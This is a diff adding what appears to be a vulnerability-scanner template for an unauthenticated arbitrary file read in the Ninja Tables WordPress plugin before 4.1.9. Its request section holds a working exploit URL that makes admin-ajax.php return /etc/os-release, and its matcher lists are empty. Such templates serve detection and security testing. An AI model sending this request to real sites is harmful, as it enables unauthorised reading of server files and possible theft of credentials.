@@ -1,0 +1,23 @@
+id: wp-ninja-tables-lfi
+brief:
+    title: Ninja Tables <4.1.9 - Unauthenticated Arbitrary File Read
+    by: xbow
+    level: high
+    about: The Ninja Tables plugin for WordPress (versions < 4.1.9) is vulnerable to an unauthenticated arbitrary file download vulnerability. The issue exists due to the improper validation of the 'url' para...
+    label:
+        - ninja-tables
+        - file-download
+        - wordpress
+        - unauth
+        - lfi
+        - wp-plugin
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/'
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-admin/admin-ajax.php?action=ninja_table_force_download&url=/etc/os-release&ninja_table_public_nonce={{public_nonce}}'
+      signs: []
